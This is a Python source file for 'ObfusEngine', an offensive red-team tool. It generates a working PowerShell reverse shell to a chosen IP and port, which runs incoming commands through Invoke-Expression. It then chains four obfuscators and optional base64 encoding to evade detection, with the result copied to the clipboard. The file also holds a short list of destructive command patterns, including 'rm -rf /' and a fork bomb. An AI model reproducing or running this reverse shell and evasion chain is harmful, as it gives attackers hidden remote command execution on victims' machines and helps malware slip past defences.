#!/usr/bin/env python3
import os
import sys
import base64
import argparse
import shlex
import logging
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
from rich.align import Align
from rich.text import Text
from rich.layout import Layout
from rich.columns import Columns
import subprocess
import shutil
import time
import pyperclip

class ObfuscationTool:
    def __init__(self):
        self.console = Console()
        self.script_dir = Path(os.environ.get('OBFUS_INSTALL_DIR', Path(__file__).parent)).resolve()
        self.setup_logging()
        self.techniques_info = {
            'invoke': {
                'name': 'Invoke-PSObfuscation',
                'description': 'PowerShell cmdlets, comments, and variable obfuscation',
                'type': 'PowerShell',
                'file': 'Invoke-PSObfuscation.ps1'
            },
            'xencrypt': {
                'name': 'BetterXencrypt',
                'description': 'Advanced PowerShell encryption and obfuscation',
                'type': 'PowerShell',
                'file': 'BetterXencrypt.ps1'
            },
            'chameleon': {
                'name': 'Chameleon',
                'description': 'Multi-layer PowerShell obfuscation with random backticks',
                'type': 'PowerShell',
                'file': 'chameleon.py'
            },
            'pyfuscation': {
                'name': 'PyFuscation',
                'description': 'Python-based PowerShell script obfuscation',
                'type': 'PowerShell',
                'file': 'PyFuscation.py'
            }
        }

    def setup_logging(self):
        """Setup logging for debugging"""
        log_file = self.script_dir / "obfusengine.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stderr)
            ]
        )
        self.logger = logging.getLogger(__name__)

    def validate_script_path(self, script_path):
        """Validate script path to prevent path traversal and ensure security"""
        try:
            resolved_path = Path(script_path).resolve()
            
            # Ensure it's a real file and not a directory
            if not resolved_path.is_file():
                self.logger.warning(f"Path is not a file: {resolved_path}")
                return False
            
            # Check file size (prevent processing extremely large files)
            file_size = resolved_path.stat().st_size
            if file_size > 10 * 1024 * 1024:  # 10MB limit
                self.logger.warning(f"File too large: {file_size} bytes")
                return False
            
            # Basic file extension validation
            allowed_extensions = {'.ps1', '.py', '.txt', '.psm1'}
            if resolved_path.suffix.lower() not in allowed_extensions:
                self.logger.warning(f"Potentially unsafe file extension: {resolved_path.suffix}")
                if not Confirm.ask(f"File has extension '{resolved_path.suffix}'. Continue anyway?"):
                    return False
            
            return True
        except Exception as e:
            self.logger.error(f"Error validating script path: {e}")
            return False

    def show_banner(self):
        banner_text = """
   ██████╗ ██████╗ ███████╗██╗   ██╗███████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
  ██╔═══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
  ██║   ██║██████╔╝█████╗  ██║   ██║███████╗█████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗
  ██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝
  ╚██████╔╝██████╔╝██║     ╚██████╔╝███████║███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
   ╚═════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝
        """
        
        banner_text_obj = Text(banner_text, style="bold cyan")
        banner_text_obj.append("\n\n")
        banner_text_obj.append("Version: ", style="bold white")
        banner_text_obj.append("v1.0.0", style="bold green")
        banner_text_obj.append(" | Author: ", style="bold white")
        banner_text_obj.append("Vibhas Dutta", style="bold cyan")
        banner_text_obj.append(" | GitHub: ", style="bold white")
        banner_text_obj.append("https://github.com/vibhasdutta/ObfusEngine", style="bold blue underline")
        
        panel = Panel(
            Align.center(banner_text_obj),
            title="[bold red]🔒 ObfusEngine - Advanced Script Obfuscation Engine 🔒[/]",
            subtitle="[dim]Modular Evasion Framework for Red Team Operations[/]",
            border_style="bright_blue",
            padding=(1, 2)
        )
        self.console.print(panel)
        self.console.print()
        
    def get_base_dir(self):
        return self.script_dir
    
    def show_techniques_menu(self):
        """Display available obfuscation techniques in a table"""
        table = Table(title="🛠️  Available Obfuscation Techniques", show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", no_wrap=True)
        table.add_column("Technique", style="green")
        table.add_column("Type", style="yellow")
        table.add_column("Description", style="white")
        
        for key, info in self.techniques_info.items():
            table.add_row(
                key,
                info['name'],
                info['type'],
                info['description']
            )
        
        table.add_row("all", "All Techniques", "Combined", "Run all available techniques sequentially")
        
        self.console.print(table)
        self.console.print()

    def get_clipboard_content(self):
        """Get script content from clipboard with validation"""
        try:
            clipboard_content = pyperclip.paste()
            if not clipboard_content.strip():
                self.console.print("[red]❌ Clipboard is empty![/]")
                return None
            
            # Basic content validation
            if len(clipboard_content) > 1024 * 1024:  # 1MB limit for clipboard
                self.console.print("[red]❌ Clipboard content too large (>1MB)[/]")
                return None
            
            # Check for potentially malicious patterns (basic heuristics)
            suspicious_patterns = ['rm -rf /', 'del /f /s /q', 'format c:', ':(){ :|:& };:']
            for pattern in suspicious_patterns:
                if pattern in clipboard_content.lower():
                    if not Confirm.ask(f"[yellow]⚠️  Potentially dangerous content detected. Continue?[/]"):
                        return None
                    break
            
            self.console.print(f"[green]✅ Retrieved {len(clipboard_content)} characters from clipboard[/]")
            self.logger.info(f"Clipboard content retrieved: {len(clipboard_content)} characters")
            return clipboard_content
        except Exception as e:
            self.console.print(f"[red]❌ Error accessing clipboard: {e}[/]")
            self.logger.error(f"Clipboard access error: {e}")
            return None

    def interactive_mode(self):
        self.show_banner()
        
        # Step 1: Choose input method
        self.console.print("[bold blue]Step 1:[/] Choose your script source")
        self.console.print("[dim]This tool can generate scripts from scratch or obfuscate existing ones[/]")
        
        # Add clipboard option to choices
        input_choice = Prompt.ask(
            "Do you want to use",
            choices=["custom", "generate", "clipboard"],
            default="generate"
        )
        
        args = argparse.Namespace()
        
        if input_choice == "custom":
            while True:
                script_path = Prompt.ask("[green]📁 Enter path to your custom script file[/]")
                if self.validate_script_path(script_path):
                    args.input_script = script_path
                    args.hxshell = False
                    self.console.print(f"[green]✅ Custom script loaded: {script_path}[/]")
                    break
                else:
                    self.console.print("[red]❌ Invalid file or security check failed. Please try again.[/]")
        elif input_choice == "clipboard":
            self.console.print("[cyan]📋 Using clipboard content as input script...[/]")
            args.hxshell = True
            args.input_script = None
        else:
            self.console.print("[cyan]🔧 Generating a reverse shell script for you...[/]")
            
            # Enhanced IP validation
            while True:
                ip_input = Prompt.ask("[green]🎯 Enter target IP address[/]")
                if self.validate_ip(ip_input):
                    args.ip = ip_input
                    break
                else:
                    self.console.print("[red]❌ Invalid IP address format. Please try again.[/]")
            
            # Enhanced port validation
            while True:
                try:
                    port_input = int(Prompt.ask("[green]🔌 Enter target port[/]", default="4444"))
                    if 1 <= port_input <= 65535:
                        args.port = port_input
                        break
                    else:
                        self.console.print("[red]❌ Port must be between 1 and 65535[/]")
                except ValueError:
                    self.console.print("[red]❌ Please enter a valid port number[/]")
            
            args.input_script = None
            args.hxshell = False
            self.console.print(f"[green]✅ Will generate reverse shell: {args.ip}:{args.port}[/]")
        
        # Step 2: Choose techniques
        self.console.print("\n[bold blue]Step 2:[/] Select obfuscation techniques")
        self.show_techniques_menu()
        
        while True:
            techniques_input = Prompt.ask(
                "[green]Enter techniques (comma-separated) or 'all'[/]",
                default="invoke"
            )
            if self.validate_techniques(techniques_input):
                args.technique = techniques_input
                break
            else:
                self.console.print("[red]❌ Invalid technique selection. Please try again.[/]")
        
        # Step 3: Output settings
        self.console.print("\n[bold blue]Step 3:[/] Output configuration")
        
        # Enhanced output filename validation
        while True:
            output_name = Prompt.ask("[green]Output filename[/]", default="obfuscated.ps1")
            if self.validate_output_filename(output_name):
                # Add default .ps1 extension if no extension provided
                if not Path(output_name).suffix:
                    output_name += ".ps1"
                    self.console.print(f"[dim]No extension provided, using: {output_name}[/]")
                args.output_name = output_name
                break
            else:
                self.console.print("[red]❌ Invalid filename. Please try again.[/]")

        args.encode = Confirm.ask("[green]Base64 encode the output?[/]", default=False)
        args.view = Confirm.ask("[green]Show script contents after obfuscation?[/]", default=True)
        
        # Set other defaults
        args.directory = str(Path.cwd())
        
        return args

    def validate_ip(self, ip_str):
        """Validate IP address format"""
        import ipaddress
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False

    def validate_techniques(self, techniques_str):
        """Validate technique selection"""
        techniques = [t.strip().lower() for t in techniques_str.split(',')]
        
        if 'all' in techniques:
            return True
        
        valid_techniques = set(self.techniques_info.keys())
        invalid_techniques = set(techniques) - valid_techniques
        
        if invalid_techniques:
            self.console.print(f"[red]❌ Unknown techniques: {', '.join(invalid_techniques)}[/]")
            return False
        
        return len(techniques) > 0

    def validate_output_filename(self, filename):
        """Validate output filename for security"""
        try:
            # Check for path traversal attempts
            if '..' in filename or '/' in filename or '\\' in filename:
                return False
            
            # Check for reserved names (Windows)
            reserved_names = {'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'COM2', 'COM3', 'COM4', 
                            'COM5', 'COM6', 'COM7', 'COM8', 'COM9', 'LPT1', 'LPT2', 
                            'LPT3', 'LPT4', 'LPT5', 'LPT6', 'LPT7', 'LPT8', 'LPT9'}
            
            name_without_ext = Path(filename).stem.upper()
            if name_without_ext in reserved_names:
                return False
            
            # Check for invalid characters
            invalid_chars = '<>:"|?*'
            if any(char in filename for char in invalid_chars):
                return False
            
            # Check length
            if len(filename) > 255:
                return False
            
            return True
        except Exception:
            return False

    def validate_environment(self, base_dir):
        """Check if required obfuscation tools are available with enhanced validation"""
        self.console.print("[bold blue]🔍 Validating Environment...[/]")
        
        validation_table = Table(title="Environment Validation", show_header=True)
        validation_table.add_column("Tool", style="cyan")
        validation_table.add_column("Status", style="white")
        validation_table.add_column("Path", style="dim")
        
        tools_status = {}
        
        # Check each technique
        for key, info in self.techniques_info.items():
            if key == 'invoke':
                path = base_dir / "Obfuscation_Technique" / info['file']
            elif key == 'xencrypt':
                path = base_dir / "Obfuscation_Technique" / info['file']
            elif key == 'chameleon':
                path = base_dir / "Obfuscation_Technique" / "Chameleon" / info['file']
            elif key == 'pyfuscation':
                path = base_dir / "Obfuscation_Technique" / "PyFuscation" / info['file']
            
            status = "✅ Available" if path.exists() else "❌ Missing"
            tools_status[key] = path.exists()
            validation_table.add_row(info['name'], status, str(path))
            
            # Log the validation results
            if path.exists():
                self.logger.info(f"Tool {key} found at {path}")
            else:
                self.logger.warning(f"Tool {key} missing at {path}")
        
        # Check PowerShell availability
        pwsh_available = shutil.which('pwsh') is not None
        validation_table.add_row(
            "PowerShell Core", 
            "✅ Available" if pwsh_available else "❌ Missing",
            shutil.which('pwsh') or "Not found"
        )
        
        # Check Python3 availability
        python_available = shutil.which('python3') is not None
        validation_table.add_row(
            "Python 3", 
            "✅ Available" if python_available else "❌ Missing",
            shutil.which('python3') or "Not found"
        )
        
        self.console.print(validation_table)
        
        missing_tools = [k for k, v in tools_status.items() if not v]
        if missing_tools:
            self.console.print(f"\n[bold red]⚠️  Warning: Missing tools: {', '.join(missing_tools)}[/]")
            self.logger.warning(f"Missing tools: {missing_tools}")
            if not Confirm.ask("Continue anyway?", default=False):
                sys.exit(1)
        else:
            self.console.print("\n[bold green]✅ All tools are available![/]")
            self.logger.info("All tools validated successfully")
        
        if not pwsh_available:
            self.console.print("\n[bold yellow]⚠️  PowerShell Core not found. PowerShell-based techniques will fail.[/]")
        
        self.console.print()

    def obfuscate_script(self, args, input_script, workspace, base_dir):
        """Enhanced obfuscation with progress tracking and better error handling"""
        output_script = workspace / args.output_name
        techniques = [t.strip().lower() for t in args.technique.split(',')]
        
        if 'all' in techniques:
            techniques = list(self.techniques_info.keys())
        
        self.console.print(f"[bold green]🎯 Target Script:[/] {input_script}")
        self.console.print(f"[bold green]📁 Output Location:[/] {output_script}")
        self.console.print(f"[bold green]🔧 Techniques:[/] {', '.join(techniques)}\n")
        
        self.logger.info(f"Starting obfuscation: input={input_script}, output={output_script}, techniques={techniques}")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=self.console
        ) as progress:
            
            main_task = progress.add_task("Overall Progress", total=len(techniques))
            successful_techniques = []
            
            for i, technique in enumerate(techniques):
                if technique not in self.techniques_info:
                    self.console.print(f"[red]❌ Unknown technique: {technique}[/]")
                    continue
                
                technique_task = progress.add_task(
                    f"Running {self.techniques_info[technique]['name']}", 
                    total=100
                )
                
                # Simulate progress for demonstration
                for step in range(0, 101, 20):
                    progress.update(technique_task, completed=step)
                    time.sleep(0.1)
                
                try:
                    success = self._run_technique(technique, input_script, output_script, base_dir)
                    
                    if success:
                        progress.update(technique_task, completed=100)
                        self.console.print(f"[green]✅ {self.techniques_info[technique]['name']} completed[/]")
                        successful_techniques.append(technique)
                        self.logger.info(f"Technique {technique} completed successfully")
                    else:
                        self.console.print(f"[red]❌ {self.techniques_info[technique]['name']} failed[/]")
                        self.logger.error(f"Technique {technique} failed")
                    
                except Exception as e:
                    self.console.print(f"[red]❌ {self.techniques_info[technique]['name']} encountered an error: {e}[/]")
                    self.logger.error(f"Technique {technique} error: {e}")
                
                progress.update(main_task, advance=1)
                
                # Update input for next technique (chaining) only if current technique succeeded
                if success and output_script.exists():
                    input_script = output_script
        
        final_success = output_script.exists() and len(successful_techniques) > 0
        
        if final_success:
            self.logger.info(f"Obfuscation completed successfully. Techniques used: {successful_techniques}")
        else:
            self.logger.error("Obfuscation failed - no techniques succeeded")
        
        return final_success

    def _run_technique(self, technique, input_script, output_script, base_dir):
        """Run individual obfuscation technique with enhanced security and error handling"""
        try:
            self.logger.info(f"Running technique: {technique}")
            
            if technique == "invoke":
                return self._run_invoke_technique(input_script, output_script, base_dir)
            elif technique == "xencrypt":
                return self._run_xencrypt_technique(input_script, output_script, base_dir)
            elif technique == "chameleon":
                return self._run_chameleon_technique(input_script, output_script, base_dir)
            elif technique == "pyfuscation":
                return self._run_pyfuscation_technique(input_script, output_script, base_dir)
            else:
                self.logger.error(f"Unknown technique: {technique}")
                return False
                
        except Exception as e:
            self.console.print(f"[red]Error running {technique}: {e}[/]")
            self.logger.error(f"Error running technique {technique}: {e}")
            return False

    def _run_invoke_technique(self, input_script, output_script, base_dir):
        """Run Invoke-PSObfuscation technique"""
        invoke_module = base_dir / "Obfuscation_Technique" / "Invoke-PSObfuscation.ps1"
        if not invoke_module.exists():
            self.console.print(f"[red]❌ Module not found: {invoke_module}[/]")
            return False
        
        # Use shlex.quote for safe shell argument handling
        safe_module = shlex.quote(str(invoke_module))
        safe_input = shlex.quote(str(input_script))
        safe_output = shlex.quote(str(output_script))
        
        cmd = (
            f"pwsh -Command \"Import-Module {safe_module}; "
            f"Invoke-PSObfuscation -Path {safe_input} -Cmdlets -Comments "
            f"-NamespaceClasses -Variables -OutFile {safe_output}\""
        )
        
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=120  # 2 minute timeout
        )
        
        if result.returncode != 0:
            self.logger.error(f"Invoke technique failed: {result.stderr}")
            return False
        
        return output_script.exists()

    def _run_xencrypt_technique(self, input_script, output_script, base_dir):
        """Run BetterXencrypt technique"""
        betterx_path = base_dir / "Obfuscation_Technique" / "BetterXencrypt.ps1"
        if not betterx_path.exists():
            self.console.print(f"[red]❌ Module not found: {betterx_path}[/]")
            return False
        
        safe_module = shlex.quote(str(betterx_path))
        safe_input = shlex.quote(str(input_script))
        safe_output = shlex.quote(str(output_script))
        
        cmd = (
            f"pwsh -Command \"Import-Module {safe_module}; "
            f"Invoke-BetterXencrypt -InFile {safe_input} "
            f"-OutFile {safe_output} -Iterations 10\""
        )
        
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=120
        )
        
        if result.returncode != 0:
            self.logger.error(f"Xencrypt technique failed: {result.stderr}")
            return False
        
        return output_script.exists()

    def _run_chameleon_technique(self, input_script, output_script, base_dir):
        """Run Chameleon technique"""
        chameleon = base_dir / "Obfuscation_Technique" / "Chameleon" / "chameleon.py"
        if not chameleon.exists():
            self.console.print(f"[red]❌ Script not found: {chameleon}[/]")
            return False
        
        safe_chameleon = shlex.quote(str(chameleon))
        safe_input = shlex.quote(str(input_script))
        safe_output = shlex.quote(str(output_script))
        
        cmd = f"python3 {safe_chameleon} {safe_input} -o {safe_output} -a -l 3 --random-backticks"
        
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=120
        )
        
        if result.returncode != 0:
            self.logger.error(f"Chameleon technique failed: {result.stderr}")
            return False
        
        return output_script.exists()

    def _run_pyfuscation_technique(self, input_script, output_script, base_dir):
        """Run PyFuscation technique"""
        pyfuscation = base_dir / "Obfuscation_Technique" / "PyFuscation" / "PyFuscation.py"
        tmp_dir = base_dir / "Obfuscation_Technique" / "PyFuscation" / "tmp"

        if not pyfuscation.exists():
            self.console.print(f"[red]❌ Script not found: {pyfuscation}[/]")
            return False
        
        safe_pyfuscation = shlex.quote(str(pyfuscation))
        safe_input = shlex.quote(str(input_script))
        
        cmd = f"python3 {safe_pyfuscation} -fvp --ps {safe_input}"
        
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=120
        )
        
        # PyFuscation has different success conditions
        output_file = tmp_dir / "script.ps1"
        if output_file.exists():
            try:
                obf_text = output_file.read_text()
                output_script.write_text(obf_text)
                
                # Clean up tmp directory
                if tmp_dir.exists():
                    shutil.rmtree(tmp_dir, ignore_errors=True)
                
                return True
            except Exception as e:
                self.logger.error(f"Error processing PyFuscation output: {e}")
                return False
        
        if result.returncode != 0:
            self.logger.error(f"PyFuscation technique failed: {result.stderr}")
        
        return False

    def show_results(self, args, input_script, workspace):
        """Display results with enhanced formatting and security"""
        output_script = workspace / args.output_name
        
        results_panel = Panel.fit(
            Align.center("[bold green]🎉 ObfusEngine - Obfuscation Complete! 🎉[/]"),
            style="green"
        )
        self.console.print(results_panel)
        
        # Results summary
        summary_table = Table(title="📊 Results Summary", show_header=True)
        summary_table.add_column("Property", style="cyan")
        summary_table.add_column("Value", style="white")
        
        if output_script.exists():
            if isinstance(input_script, Path) and input_script.exists():
                original_size = input_script.stat().st_size
            else:
                original_size = len(str(input_script)) if input_script else 0
            
            obfuscated_size = output_script.stat().st_size
            
            summary_table.add_row("Original Size", f"{original_size:,} bytes")
            summary_table.add_row("Obfuscated Size", f"{obfuscated_size:,} bytes")
            summary_table.add_row("Size Ratio", f"{obfuscated_size/max(original_size, 1):.2f}x")
            summary_table.add_row("Output File", str(output_script))
            
            if args.encode:
                encoded_path = workspace / f"{Path(args.output_name).stem}_base64.txt"
                summary_table.add_row("Encoded File", str(encoded_path))
        
        self.console.print(summary_table)
        
        if args.view and output_script.exists():
            self.show_script_comparison(input_script, output_script, workspace, args)
        
        # Enhanced clipboard handling with error checking
        try:
            obfuscated_content = output_script.read_text()
            pyperclip.copy(obfuscated_content)
            self.console.print("\n[bold orange]📋 Script copied to clipboard![/]")
            self.logger.info("Script copied to clipboard successfully")
        except Exception as e:
            self.console.print(f"\n[bold red]❌ Failed to copy to clipboard: {e}[/]")
            self.logger.error(f"Clipboard copy failed: {e}")

    def show_script_comparison(self, input_script, output_script, workspace, args):
        """Show side-by-side script comparison with content truncation for security"""
        self.console.print("\n[bold blue]📋 Script Comparison[/]")
        
        max_display_length = 500
        
        # Original script
        if isinstance(input_script, Path) and input_script.exists():
            original_content = input_script.read_text()
            if len(original_content) > max_display_length:
                original_content = original_content[:max_display_length] + "\n... (truncated)"
        else:
            original_content = str(input_script)
            if len(original_content) > max_display_length:
                original_content = original_content[:max_display_length] + "\n... (truncated)"
        
        # Obfuscated script
        obfuscated_content = output_script.read_text()
        if len(obfuscated_content) > max_display_length:
            obfuscated_content = obfuscated_content[:max_display_length] + "\n... (truncated)"
        
        # Create side-by-side panels
        original_panel = Panel(
            original_content,
            title="[bold green]Original Script[/]",
            border_style="green"
        )
        
        obfuscated_panel = Panel(
            obfuscated_content,
            title="[bold red]Obfuscated Script[/]",
            border_style="red"
        )
        
        columns = Columns([original_panel, obfuscated_panel], equal=True)
        self.console.print(columns)
        
        if args.encode:
            encoded_path = workspace / f"{Path(args.output_name).stem}_base64.txt"
            if encoded_path.exists():
                self.console.print(f"\n[bold cyan]🔐 Base64 Encoded Version:[/]")
                try:
                    encoded_content = encoded_path.read_text()
                    if len(encoded_content) > 200:
                        encoded_content = encoded_content[:200] + "\n... (truncated)"
                    
                    encoded_panel = Panel(
                        encoded_content,
                        title="[bold yellow]Base64 Encoded[/]",
                        border_style="yellow"
                    )
                    self.console.print(encoded_panel)
                except Exception as e:
                    self.console.print(f"[red]❌ Error reading encoded file: {e}[/]")

def setup_argparse():
    """Setup argument parser with enhanced validation"""
    # Get program name from environment variable or default
    prog_name = os.environ.get('OBFUS_PROG_NAME', 'obfusengine')
    parser = argparse.ArgumentParser(
        prog=prog_name,
        description="🔒 ObfusEngine v1.0.0 - Advanced Script Obfuscation Engine\nGenerates and obfuscates scripts for red team operations\n\nAuthor: Vibhas Dutta\nGitHub: https://github.com/vibhasdutta/ObfusEngine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                                         # Interactive mode (default)
  %(prog)s -i 192.168.1.10 -p 4444 -t all        # Generate & obfuscate reverse shell
  %(prog)s -I script.ps1 -t invoke,chameleon      # Obfuscate existing script  
  %(prog)s --hxshell -t all -e                    # Use Hoaxshell Payload content with all techniques
  %(prog)s -I payload.py -t pyfuscation -e -v     # Obfuscate with encoding and view

Note: Interactive mode launches automatically when sufficient arguments aren't provided.

Report bugs: https://github.com/vibhasdutta/ObfusEngine/issues
        """
    )
    
    # Input options
    input_group = parser.add_argument_group('Input Options')
    input_group.add_argument("-I", "--input-script", help="Path to existing script (PowerShell or Python)")
    input_group.add_argument("-i", "--ip", help="Target IP address for generated reverse shell")
    input_group.add_argument("-p", "--port", type=int, help="Target port number for reverse shell")
    input_group.add_argument("--hxshell", action="store_true", help="Use Hoaxshell Payload as input script")
    
    # Obfuscation options
    obf_group = parser.add_argument_group('Obfuscation Options')
    obf_group.add_argument("-t", "--technique", help="Comma-separated techniques: invoke,xencrypt,chameleon,pyfuscation,all")
    obf_group.add_argument("--version", action="version", version="ObfusEngine v1.0.0")
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument("-d", "--directory", default=str(Path.cwd()), help="Working directory")
    output_group.add_argument("-oN", "--output-name", default="obfuscated.ps1", help="Output filename (defaults to .ps1 if no extension given)")
    output_group.add_argument("-e", "--encode", action="store_true", help="Base64 encode the output")
    output_group.add_argument("-v", "--view", action="store_true", help="Show script contents verbosely")
    
    return parser.parse_args()

def main():
    """Main function with enhanced error handling and security"""
    try:
        tool = ObfuscationTool()
        args = setup_argparse()
        
        # Add default .ps1 extension if none provided
        if not Path(args.output_name).suffix:
            args.output_name += ".ps1"
        
        # Interactive mode is now default - only skip if specific args provided
        if not (args.technique and (args.input_script or args.hxshell or (args.ip and args.port))):
            args = tool.interactive_mode()
        
        # Enhanced validation
        if not args.input_script and not args.hxshell and not (args.ip and args.port):
            tool.console.print("[bold red]❌ Error: Configuration incomplete[/]")
            tool.console.print("[yellow]💡 Tip: Run without arguments to use interactive mode[/]")
            sys.exit(1)
        
        if not args.technique:
            tool.console.print("[bold red]❌ Error: Technique parameter is required[/]")
            sys.exit(1)
        
        # Validate IP and port if provided
        if args.ip and not tool.validate_ip(args.ip):
            tool.console.print(f"[bold red]❌ Error: Invalid IP address: {args.ip}[/]")
            sys.exit(1)
        
        if args.port and not (1 <= args.port <= 65535):
            tool.console.print(f"[bold red]❌ Error: Invalid port number: {args.port}[/]")
            sys.exit(1)
        
        # Setup directories with proper validation
        base_dir = tool.get_base_dir()
        workspace = Path(args.directory).resolve() / "ObfusWorkspace"
        
        try:
            workspace.mkdir(parents=True, exist_ok=True)
        except PermissionError:
            tool.console.print(f"[red]❌ Permission denied creating workspace: {workspace}[/]")
            sys.exit(1)
        except Exception as e:
            tool.console.print(f"[red]❌ Error creating workspace: {e}[/]")
            sys.exit(1)
        
        # Validate environment
        tool.validate_environment(base_dir)
        
        # Prepare input script with enhanced security
        if args.hxshell:
            # Use clipboard content
            tool.console.print("[bold cyan]📋 HxShell Mode: Reading script from clipboard...[/]")
            clipboard_content = tool.get_clipboard_content()
            
            if not clipboard_content:
                tool.console.print("[red]❌ Error: Could not retrieve script from clipboard[/]")
                sys.exit(1)
            
            input_script = workspace / "clipboard_script.ps1"
            try:
                input_script.write_text(clipboard_content)
                tool.console.print(f"[green]✅ Script from clipboard saved to temporary file[/]")
            except Exception as e:
                tool.console.print(f"[red]❌ Error saving clipboard content: {e}[/]")
                sys.exit(1)
                
        elif args.input_script:
            input_script = Path(args.input_script).resolve()
            if not tool.validate_script_path(input_script):
                tool.console.print(f"[red]❌ Error: Invalid or unsafe input script: {input_script}[/]")
                sys.exit(1)
            tool.console.print(f"[green]✅ Using custom script: {input_script}[/]")
        else:
            # Auto-generate reverse shell with input validation
            ps_script = f'''$LHOST = "{args.ip}"; $LPORT = {args.port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''
            
            input_script = workspace / "reverse_shell.ps1"
            try:
                input_script.write_text(ps_script)
                tool.console.print(f"[green]✅ Auto-generated reverse shell script[/]")
            except Exception as e:
                tool.console.print(f"[red]❌ Error creating reverse shell script: {e}[/]")
                sys.exit(1)
        
        # Run obfuscation
        tool.console.print(Panel.fit("🚀 Starting Obfuscation Process", style="bold blue"))
        success = tool.obfuscate_script(args, input_script, workspace, base_dir)
        
        if success:
            # Handle base64 encoding with error handling
            if args.encode:
                output_script = workspace / args.output_name
                encoded_path = workspace / f"{Path(args.output_name).stem}_base64.txt"
                try:
                    with open(output_script, "rb") as f:
                        encoded_data = base64.b64encode(f.read()).decode()
                    encoded_path.write_text(encoded_data)
                    tool.console.print(f"[cyan]🔐 Base64 encoded output saved[/]")
                except Exception as e:
                    tool.console.print(f"[red]❌ Error creating base64 encoded file: {e}[/]")
            
            # Show results
            tool.show_results(args, input_script, workspace)
        else:
            tool.console.print("[red]❌ Obfuscation failed![/]")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n[bold red]❌ Operation cancelled by user[/]")
        sys.exit(1)
    except Exception as e:
        print(f"[bold red]❌ Unexpected error: {e}[/]")
        logging.error(f"Unexpected error in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()